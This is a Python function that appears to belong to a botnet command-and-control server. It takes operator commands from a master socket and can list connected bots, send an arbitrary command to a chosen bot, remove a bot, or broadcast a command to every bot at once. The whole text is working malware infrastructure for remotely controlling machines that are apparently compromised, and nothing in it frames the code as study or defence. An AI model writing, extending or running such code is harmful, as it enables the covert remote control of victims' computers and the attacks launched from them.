def execCommand(bots, tokens, mastersock):

    # ls command. Either ls or ls <ip_addr> 
    if tokens[0] == "ls":
        lsResult = '' 

        if len(tokens) == 1:
             
            # If there are no bots 
            if len(bots) == 0:
                mastersock.send("[-] No bots available".encode())
            for bot in bots:
                lsResult += bot.prettyPrint()

            mastersock.send(lsResult.encode())

        elif len(tokens) == 2:
            for bot in bots:
                if bot.ip == tokens[1]:
                    lsResult += bot.prettyPrint()

            mastersock.send(lsResult.encode())

    # Send specific bot command 
    elif tokens[0].isdigit():
        print("[+] Bot[" + str(tokens[0]) + "]. Command: ", tokens[1])

        # Send command, receive result, and send the result back to the master socket.
        for bot in bots:
            if bot.idx == int(tokens[0]):
                bot.sock.send(tokens[1].encode())
                #result = bot.sock.recv(4096).decode()

                # Sends back the debug message because master expects that 
                result = "\n[+] Bot[" + str(tokens[0]) + "]. Command: " + str(tokens[1])
                result +=  "\nCommand successfully delivered to all bots.\n"
                mastersock.send(result.encode())

    elif tokens[0] == "remove":
        if len(tokens) == 2 and tokens[1].isdigit():
            for bot in bots:
                if bot.idx == int(tokens[1]):
                    bots.remove(bot)

    elif tokens[0] == "broadcast":
        print("[+] Sending broadcast command to all bots")
        for bot in bots:
            bot.sock.send(tokens[1].encode())
            mastersock.send("\nCommand successfully delivered to all bots\n".encode())

    else:
        print("[DEBUG] token length = ", len(tokens))
        mastersock.send("Wrong command".encode())

